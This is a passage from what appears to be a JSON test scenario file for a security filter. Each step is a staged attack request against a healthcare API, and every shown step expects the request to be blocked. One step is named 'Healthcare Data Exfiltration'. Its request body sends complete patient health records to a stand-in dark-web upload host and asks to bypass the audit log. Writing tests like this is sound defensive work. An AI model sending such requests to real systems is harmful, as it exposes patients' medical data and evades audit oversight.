      },
      "execution": {
        "delayMs": 7000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "healthcare-genetic-data-1"
      ]
    },
    {
      "id": "healthcare-exfiltration-1",
      "name": "Healthcare Data Exfiltration via Encrypted Channel",
      "stage": "exfiltration",
      "request": {
        "method": "POST",
        "url": "/api/hipaa/transfer/encrypted",
        "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Secure-Medical-Transfer/3.0"
        },
        "body": "{\"destination\": \"https://dark-web-medical-marketplace.onion/upload\", \"encryption_key\": \"medical_master_key_2024\", \"data_classification\": \"phi_complete\", \"bypass_audit_log\": true, \"compression_ratio\": 0.1}"
      },
      "execution": {
        "delayMs": 10000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "healthcare-mental-health-1"
      ]
